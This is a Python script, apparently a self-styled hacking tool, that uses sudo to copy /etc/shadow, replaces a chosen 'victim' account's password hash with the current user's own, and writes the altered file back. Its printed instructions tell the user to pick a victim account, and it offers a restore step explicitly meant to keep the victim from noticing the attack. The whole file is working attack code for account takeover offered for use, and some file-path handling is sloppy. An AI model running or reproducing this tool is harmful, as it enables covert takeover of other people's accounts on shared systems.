import os
import getpass
from pwd import getpwnam 
import colorama
from colorama import Fore, Style
 
pwd = os.popen("pwd").read()
path=pwd[0:len(pwd)-1]+"/etc.txt"
backup=pwd[0:len(pwd)-1]+"/backup.txt"

os.system("touch path")	
os.system("sudo cp /etc/shadow path")  #Copying shadow file to temporary file
os.system("sudo cp path backup") #Backup File

print(Fore.BLUE +"_____________________________________________________________________________")
print(Fore.BLUE +"*****************************************************************************")
print(Fore.BLUE +"-----------------------------------------------------------------------------")
print(Fore.RED +"	>>>>>> ***                                  ____         *** <<<<<< ")
print(Fore.RED +"	>>>>>> *** \    / |----  |\  |  |  |\  |    |   |  \  /  *** <<<<<<")
print(Fore.RED +"	>>>>>> ***  \  /  |--    | \ |  |  | \ | *  |___|   \/   *** <<<<<<" )
print(Fore.RED +"	>>>>>> ***   \/   |----  |  \|  |  |  \|    |       /    *** <<<<<<")
print(Fore.BLUE +"_____________________________________________________________________________")
print(Fore.BLUE +"*****************************************************************************")
print(Fore.BLUE +"-----------------------------------------------------------------------------")
print(Style.RESET_ALL)

print(Fore.BLUE +"-----------------")
print(" ::INSTRUCTIONS::                Please Read Instructions before start!")
print(Fore.BLUE +"----------------- \n")
print(Fore.RED +"-> You should have right to use 'cp' command, if you don't this won't work :( ")
print(Fore.RED +"-> This script will change the password of specified account with current user's password.")
print(Fore.RED +"-> Please Only select valid username to which you want to gain access.")
print(Fore.RED +"-> To check all accounts present in your system type: 'compgen -u' in other terminal window and only")
print(Fore.RED +"   input the valid user account(~Dont Forget).")
print(Fore.RED +"-> Luckily, this tool provide backup option::You can restore the changes by responding '2' when")
print(Fore.RED +"   system asks you for that, so that victim will not feel any suspiciousness.")
print(Style.RESET_ALL)

print(Fore.YELLOW +"->	Enter '1' to gain access to the specified Username.")
choice=raw_input(Fore.YELLOW+"->	Enter '2' to Restore changes, so that victim will not notify the attack. \n")


#This function will get the outer index of the password
def get_indexes(line,length):
		counter =0
		
		while length > 0 :
			length=length-1
			if(line[length] == ":"):
				counter=counter+1
				if(counter == 7):
					return length

current_name=getpass.getuser() #getting current user name

if (choice == '1'): # means user want to escalate prevlidge of specified account
	print(Style.RESET_ALL)
	input=raw_input(Fore.YELLOW+"\n\n ::Enter valid user account name you want to gain access:: \n ")
	
	PSWD_INDEXES ={
	"source_lineNo":0,
	"source_startingindex":0,
	"source_endingindex":0,
	"source_password":" ",

	"target_lineNo":0,
	"target_startingindex":0,
	"target_endingindex":0
	}


	invalid_user_flag =1
	file = open("path","r")
	lines= file.readlines()
	count=0
	# This loop gets the target password
	for eachline in lines:
			
		count=count+1
		line=eachline.strip()
		bound=len(line)		
		for i in range(0,bound):

			if(line[i] is ':'):

				if(line[0:i] == input):
					invalid_user_flag =0
					outer_bound=get_indexes(line,bound)
					PSWD_INDEXES['target_lineNo'] =count-1
					PSWD_INDEXES['target_startingindex'] =i+1				
					PSWD_INDEXES['target_endingindex'] =outer_bound

					break;
	
	if(invalid_user_flag ==1):
		print(Fore.RED +"Invalid user-name: Try running the program again and input correct username.")		   
		print(Style.RESET_ALL)
		exit()
	

	file = open("path","r")
	lines= file.readlines()
	count=0
	# This loop gets the source password
	for eachline in lines:
			
		count=count+1
		line=eachline.strip()
		bound=len(line)		
		for i in range(0,bound):

			if(line[i] is ':'):

				if(line[0:i] == current_name):

					outer_bound=get_indexes(line,bound)
					PSWD_INDEXES['source_lineNo'] =count-1
					PSWD_INDEXES['source_startingindex'] =i+1				
					PSWD_INDEXES['source_endingindex'] =outer_bound
					PSWD_INDEXES['source_password'] =line[i+1: outer_bound]

					break;
									



	file = open("path","r") 
	lines= file.readlines()
	file.close();

	temp= lines[PSWD_INDEXES['target_lineNo']]
	duplicated_password=temp[0:PSWD_INDEXES['target_startingindex']]+PSWD_INDEXES['source_password']+temp[PSWD_INDEXES['target_endingindex'] : len(temp)]
	lines[PSWD_INDEXES['target_lineNo']]=duplicated_password
	
	file = open("path","w")
	file.writelines(lines)
	file.close();

	file = open("path","r") 
	lines= file.readlines()
	file.close();

	# Replacing tempered shadow file with the original one
	os.system("sudo cp path /etc/shadow")

	print(Fore.YELLOW +"		|**********************************************|")
	print(Fore.YELLOW+"           	|		Enjoy Buddy!!                  |")
	print(Fore.YELLOW+"		|**********************************************| \n\n")
	print(">>>>>>>>>>> Your victim password is same as yours :)  <<<<<<<<<<< \n")
	print("		   Dont you Believe? Just try it!! \n\n\n")
if (choice == '2'):
   os.system("sudo cp backup /etc/shadow")
   print("Password restored successfully!! \n\n\n")


